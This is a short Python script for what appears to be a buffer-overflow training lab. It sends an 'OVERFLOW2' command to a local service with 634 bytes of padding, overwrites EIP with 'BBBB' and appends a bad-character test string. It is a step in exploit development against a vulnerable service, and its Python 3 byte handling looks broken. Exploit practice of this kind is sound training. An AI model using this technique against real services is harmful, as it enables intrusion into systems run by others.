import socket
import struct

HOST = "127.0.0.1"
PORT = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
print(s.recv(1024))

badchar_test = ""
badchars = [0x00]	# Definite bad chars

for i in range(0x00, 0xFF + 1):	# range(0x00, 0xFF) only returns up to 0xFE
	if i not in badchars:
		badchar_test += chr(i)
		
with open("badchars.bin", "wb") as f:
    f.write(badchar_test)
    
offset = 634

buf = b""
buf += b"OVERFLOW2 "
buf += b"A" * offset        #PADDING
buf += b"BBBB"         #EIP
buf += badchar_test    #Payload

s.send(buf)
print(s.recv(1024))
